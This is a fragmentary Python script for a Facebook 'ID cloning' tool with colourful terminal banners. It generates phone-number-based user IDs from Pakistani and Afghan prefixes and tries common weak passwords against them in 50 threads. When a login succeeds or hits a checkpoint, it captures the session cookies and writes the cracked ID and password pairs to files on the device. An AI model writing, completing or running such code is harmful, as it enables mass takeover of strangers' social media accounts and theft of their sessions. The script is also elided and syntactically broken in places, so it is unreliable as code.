...
def o():
    ...
    jalan("     \033[1;33m[🔰\033[1;33m] \033[92;1mYOUR IP ADDRES \033[38;5;196m: \33[m\033[1;91m\033[38;5;46m\033[38;5;46m"+ip)
    print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
    jalan("     \033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mPLAY RANDOM CLONING   ")
    print("     \033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mJOIN TELEGRAM CHANNEL ")
    Mahin = input('     \033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mYOUR CHOICE \033[38;5;196m: ')
    if Mahin == '1':
        i()
  #   if Mahin == '2':
...
\x1b[38;5;196m`------'`------'`------'`------'`------'`------'`------'
 ...
 \033[1;93m**************************************************
 \033[1;93m|     \033[1;96m[🔥] CREATED BY:                   ALONE KING
 \033[1;93m|     \033[1;32m[🔥] FACEBOK      : UNKNOWN
 \033[1;93m|     \033[1;35m[🔥] GITHUB       : AFGHANBIO
 \033[1;93m|     \033[1;36m[🔥] TOOL STATUS  : \033[1;36m ACTIVE FREE        \033[1;93m|
 \033[1;93m|     \033[1;36m[🔥] TOOL VIRSION :  \033[1;36m0.1                 \033[1;93m|
 \033[1;93m|     \033[1;36m[🔥] TELEGRAM : UNKNOWN
 \033[1;93m**************************************************""")
try:
    print("\033[38;5;46m\nTOOL IS NOW FLYING 🕊️\n")
    time.sleep(2)
    Mahin()
...
try:
    ...
    if str(v) in update:
        os.system('clear')
        os.system("espeak \"HELLO DEAR, ITS DEMONIC HERE. TCS FB ID CLONNING TOOL IS FLYING.  PLEASE WAIT \"")
    else:pass
...
def i():
    ...
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print('    \033[97;1m[\033[92;1m🔥\033[97;1m]\033[38;5;46mPAKISTAN🇵🇰 CODE    \033[38;5;196m:\033[1;97m 92301 92302 92303 92305')
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print('    \033[97;1m[\033[92;1m🔥\033[97;1m]\033[38;5;46mAFGHANISTAN CODE🇧🇩 CODE    \033[38;5;196m:\033[1;97m 9378.9370.9379.9377)
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    code = input('    \033[38;5;196mINPUT CODE \033[1;97m: ')
    print("")
    os.system('clear')
    print(logo)
    print("             \033[1;97m[\033[1;33mDEMONIC\033[1;97m]")
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        # print('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mDEMONIC_OK.txt')
        # print('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mDEMONIC_CP.txt')
        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
       ...
       # jalan("     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[1;97mMIX IDZ CLONING ENJOY DEAR USER ✔")
        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
        for love in user:
            pwx = [love,'afghanistan,'i love you']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[DEMONIC_OK[🔥] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES[💉] : \033[38;5;46m'+coki+ ' ')                
                os.system("espeak \"sir,  ok ids\"")
                open('/sdcard/DEMONIC_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;196m[DEMONIC_CP[😪] ' +uid+ '|' +ps+ '  \33[0;97m')
                ###os.system("espeak \"sir,  Cp ids\"")
                open('/sdcard/DEMONIC_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
